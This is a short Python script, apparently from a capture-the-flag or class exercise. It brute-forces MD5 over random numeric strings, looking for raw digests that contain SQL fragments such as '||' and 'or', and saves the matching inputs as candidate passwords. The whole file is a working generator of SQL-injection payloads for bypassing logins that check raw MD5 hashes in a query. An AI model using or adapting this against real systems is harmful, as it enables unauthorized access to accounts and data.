from hashlib import md5
import random
import string

f = open("possible_pass.txt", "a")

random.seed()

i = 0
while(1):
    str_numbers = ''
    for j in range(4):
        x = random.randint(0, 32767)
        str_numbers = str_numbers + str(x)
    
    # f.write(str_numbers + "\n")

    # print(str_numbers)
    if(i % 100000 == 0):
        print(i)
    i = i + 1

    result = md5(str_numbers.encode())
    # print(result)
    digest = result.digest()
    # print(digest)

    match1 = digest.find(b"'||'")
    match2 = digest.find(b"'OR'")
    match3 = digest.find(b"'Or'")
    match4 = digest.find(b"'oR'")
    match5 = digest.find(b"'or'")

    # for some reason the code to check if the characters were followed by a number caused the code to take forever. After reaching 1 billion+ checks I commented out the checks and was just going to do it manually
    if match1 >= 0:
        # index = match1 + 4
        # print(digest[index])
        # if index < len(digest) and digest[index] > 48 and digest[index] < 58:
        print(str_numbers)
        print(digest)
        # print("necessary characters found at index: " + str(match1))
        f.write(str_numbers + "\n")
        # exit()
    if match2 >= 0:
        # index = match1 + 4
        # print(digest[index])
        # if index < len(digest) and digest[index] > 48 and digest[index] < 58:
        print(str_numbers)
        print(digest)
        # print("necessary characters found at index: " + str(match1))
        f.write(str_numbers + "\n")
        # exit()
    if match3 >= 0:
        # index = match1 + 4
        # print(digest[index])
        # if index < len(digest) and digest[index] > 48 and digest[index] < 58:
        print(str_numbers)
        print(digest)
        # print("necessary characters found at index: " + str(match1))
        f.write(str_numbers + "\n")
        # exit()
    if match4 >= 0:
        # index = match1 + 4
        # print(digest[index])
        # if index < len(digest) and digest[index] > 48 and digest[index] < 58:
        print(str_numbers)
        print(digest)
        # print("necessary characters found at index: " + str(match1))
        f.write(str_numbers + "\n")
        # exit()
    if match5 >= 0:
        # index = match1 + 4
        # print(digest[index])
        # if index < len(digest) and digest[index] > 48 and digest[index] < 58:
        print(str_numbers)
        print(digest)
        # print("necessary characters found at index: " + str(match1))
        f.write(str_numbers + "\n")
        # exit()
    